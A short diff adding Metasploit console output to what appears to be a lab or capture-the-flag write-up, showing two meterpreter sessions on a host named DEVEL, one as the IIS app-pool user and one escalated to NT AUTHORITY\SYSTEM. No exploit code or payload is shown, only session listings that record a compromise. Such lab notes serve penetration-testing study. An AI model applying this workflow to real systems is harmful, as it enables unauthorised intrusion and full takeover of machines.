@@ -69,3 +69,14 @@ Process List
  PID  PPID  Name          Arch  Session  User  Path
  ---  ----  ----          ----  -------  ----  ----
  432  368   winlogon.exe  x86   1              C:\Windows\system32\winlogon.exe
+
+
+msf6 exploit(multi/handler) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                  Connection
+  --  ----  ----                     -----------                  ----------
+  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL      10.10.16.52:1234 -> 10.10.10.5:49456 (10.10.10.5)
+  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ DEVEL  10.10.16.52:1234 -> 10.10.10.5:49453 (10.10.10.5)
